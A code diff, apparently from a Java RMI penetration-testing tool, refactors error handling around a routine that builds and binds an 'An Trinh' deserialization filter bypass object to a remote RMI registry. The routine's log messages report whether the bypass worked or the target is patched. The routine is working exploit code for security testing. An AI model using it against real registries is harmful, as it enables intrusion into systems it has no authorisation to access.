@@ -58,7 +58,58 @@ public class RegistryClient {
         }
     }
 
-    public Object generateBypassObject(String host, int port)
+    public void invokeAnTrinhBypass(String host, int port)
+    {
+        Object payloadObject = null;
+
+        try {
+            payloadObject = generateBypassObject(host, port);
+
+        } catch( Exception e ) {
+            Logger.printlnMixedYellow("Caught unexpected", e.getClass().getName(), "during generateBypassObject call.");
+            Logger.println("Please report this to improve rmg :)");
+            RMGUtils.stackTrace(e);
+            RMGUtils.exit();
+        }
+
+        try {
+            bindCall(payloadObject);
+
+        } catch(java.rmi.ConnectException e) {
+            Logger.eprintlnMixedYellow("Caught unexpected", "ConnectException", "during bindCall operation.");
+            RMGUtils.stackTrace(e);
+            RMGUtils.exit();
+
+        } catch(java.rmi.ConnectIOException e) {
+            Logger.eprintlnMixedYellow("Caught", "ConnectIOException", "during DGC operation.");
+            Logger.eprintlnMixedBlue("Remote endpoint probably uses an", "SSL socket");
+            Logger.eprintlnMixedYellow("Retry with the", "--ssl", "option.");
+            RMGUtils.stackTrace(e);
+            RMGUtils.exit();
+
+        } catch(java.rmi.ServerException e) {
+
+            Throwable cause = RMGUtils.getCause(e);
+            if( cause instanceof java.rmi.AccessException && cause.getMessage().contains("is non-local host")) {
+                Logger.eprintMixedYellow("Caught", "AccessException", "during bindCall.");
+                Logger.printlnPlainMixedBlue(" Deserialization filter bypass", "failed.");
+                Logger.eprintlnMixedYellow("The targeted server is most likely patched", "(not vulnerable)");
+                RMGUtils.showStackTrace(e);
+                RMGUtils.exit();
+            }
+
+        } catch( Exception e ) {
+            Logger.printlnMixedYellow("Caught unexpected", e.getClass().getName(), "during registry.bind() call.");
+            Logger.println("Please report this to improve rmg :)");
+            RMGUtils.stackTrace(e);
+            RMGUtils.exit();
+        }
+
+        Logger.printlnMixedBlue("Caught", "no Exception", "during the registry.bind() call.");
+        Logger.printlnMixedYellow("Deserialization filter bypass", "probably worked :)");
+    }
+
+    public Object generateBypassObject(String host, int port) throws Exception
     {
         TCPEndpoint endpoint = new TCPEndpoint(host, port);
         UnicastRef refObject = new UnicastRef(new LiveRef(new ObjID(123), endpoint, false));
@@ -70,25 +121,15 @@ public class RegistryClient {
             payloadInvocationHandler);
 
         UnicastRemoteObject payloadObject = null;
+        payloadObject = (UnicastRemoteObject)constructor.newInstance(new Object[]{0, null, new DummySocketFactory()});
+        UnicastRemoteObject.unexportObject(payloadObject, true);
 
-        try {
-            payloadObject = (UnicastRemoteObject)constructor.newInstance(new Object[]{0, null, new DummySocketFactory()});
-            UnicastRemoteObject.unexportObject(payloadObject, true);
-
-            ssfField.set(payloadObject, proxySSF);
-
-        } catch( Exception e ) {
-            Logger.printlnMixedYellow("Caught unexpected", e.getClass().getName(), "during registry.bind() call.");
-            Logger.println("Please report this to improve rmg :)");
-            RMGUtils.stackTrace(e);
-            RMGUtils.exit();
-        }
-
+        ssfField.set(payloadObject, proxySSF);
         return payloadObject;
     }
 
     @SuppressWarnings("deprecation")
-    public void bindCall(Object payloadObject)
+    public void bindCall(Object payloadObject) throws Exception
     {
         try {
             Endpoint endpoint = rmi.getEndpoint();
@@ -110,34 +151,51 @@ public class RegistryClient {
             remoteRef.done(call);
 
         } catch(java.rmi.ConnectException e) {
-            Logger.eprintlnMixedYellow("Caught", "ConnectException", "during DGC operation.");
-            RMGUtils.stackTrace(e);
-            RMGUtils.exit();
 
-        } catch(java.rmi.ConnectIOException e) {
-            Logger.eprintlnMixedYellow("Caught", "ConnectIOException", "during DGC operation.");
-            Logger.eprintlnMixedBlue("Remote endpoint probably uses an", "SSL socket");
-            Logger.eprintlnMixedYellow("Retry with the", "--ssl", "option.");
-            RMGUtils.stackTrace(e);
-            RMGUtils.exit();
+            Throwable t = RMGUtils.getCause(e);
 
-        } catch(java.rmi.ServerException e) {
-
-            Throwable cause = RMGUtils.getCause(e);
-            if( cause instanceof java.rmi.AccessException && cause.getMessage().contains("is non-local host")) {
-                Logger.eprintlnMixedYellow("Deserialization filter bypass", "failed.");
-                Logger.eprintlnMixedYellow("The targeted server is most likely patched", "(not vulnerable)");
+            if( t instanceof java.net.ConnectException && t.getMessage().contains("Connection refused")) {
+                Logger.eprintlnMixedYellow("Caught unexpected", "ConnectException", "during bindCall operation.");
+                Logger.eprintMixedBlue("Target", "refused", "the connection.");
+                Logger.printlnPlainMixedBlue(" The specified port is probably", "closed.");
                 RMGUtils.showStackTrace(e);
+                RMGUtils.exit();
+
+            } else {
+                Logger.eprintlnMixedYellow("Caught unexpected", "ConnectException", "during bindCall operation.");
+                RMGUtils.stackTrace(e);
+                RMGUtils.exit();
             }
 
-        } catch( Exception e ) {
-            Logger.printlnMixedYellow("Caught unexpected", e.getClass().getName(), "during registry.bind() call.");
-            Logger.println("Please report this to improve rmg :)");
-            RMGUtils.stackTrace(e);
-            RMGUtils.exit();
-        }
+        } catch(java.rmi.ConnectIOException e) {
 
-        Logger.printlnMixedBlue("Caught", "no Exception", "during the registry.bind() call.");
-        Logger.printlnMixedYellow("Deserialization filter bypass", "probably worked :)");
+            Throwable t = RMGUtils.getCause(e);
+
+            if( t instanceof java.net.NoRouteToHostException) {
+                Logger.eprintlnMixedYellow("Caught unexpected", "NoRouteToHostException", "during bindCall operation.");
+                Logger.eprintln("Have you entered the correct target?");
+                RMGUtils.showStackTrace(e);
+                RMGUtils.exit();
+
+            } else if( t instanceof java.rmi.ConnectIOException && t.getMessage().contains("non-JRMP server")) {
+                Logger.eprintlnMixedYellow("Caught unexpected", "ConnectIOException", "during bindCall operation.");
+                Logger.eprintMixedBlue("Remote endpoint is either", "no RMI endpoint", "or uses an");
+                Logger.printlnPlainBlue(" SSL socket.");
+                Logger.eprintlnMixedYellow("Retry the operation using the", "--ssl", "option.");
+                RMGUtils.showStackTrace(e);
+                RMGUtils.exit();
+
+            } else if( t instanceof javax.net.ssl.SSLException && t.getMessage().contains("Unsupported or unrecognized SSL message")) {
+                Logger.eprintlnMixedYellow("Caught unexpected", "SSLException", "during bindCall operation.");
+                Logger.eprintlnMixedBlue("You probably used", "--ssl", "on a plaintext connection?");
+                RMGUtils.showStackTrace(e);
+                RMGUtils.exit();
+
+            } else {
+                Logger.eprintlnMixedYellow("Caught unexpected", "ConnectIOException", "during bindCall operation.");
+                RMGUtils.stackTrace(e);
+                RMGUtils.exit();
+            }
+        }
     }
 }
